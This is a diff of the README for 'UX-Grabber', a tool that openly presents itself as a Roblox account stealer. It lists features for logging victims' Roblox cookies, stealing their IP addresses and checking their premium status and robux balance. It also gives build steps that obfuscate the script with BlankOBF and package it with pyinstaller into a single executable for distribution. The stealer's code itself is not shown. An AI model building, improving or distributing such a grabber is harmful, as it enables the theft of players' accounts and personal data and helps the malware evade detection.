@@ -2,6 +2,24 @@
   UX-Grabber 🍪 
 </h1>
 
+<br>
+<details>
+  <summary>Features</summary>
+    <ul>
+        
+    - Log Roblox Cookies ✔
+        
+    - Check if they are premium ✔
+        
+    - Steals IP ✔
+        
+    - Check their robux balance ✔ 
+        
+    - Obfuscation ✔
+        
+</details>
+<br>
+
 ## Instructions:
 
 ### Replace this
@@ -25,16 +43,3 @@ $ py BlankOBF.py main.py
 ```bash
 $ pyinstaller --onefile --clean --i NONE Obfuscated_main.py
 ```
-
-#### Install requirements
-```bash
-$ pip install -r requirements.txt
-```
-
-- Features.
-  - Log Roblox Cookies ✔
-  - Check if they are premium ✔
-  - Steals IP ✔
-  - Check their robux balance ✔
-  - Obfuscation ✔
-  - And more ✔
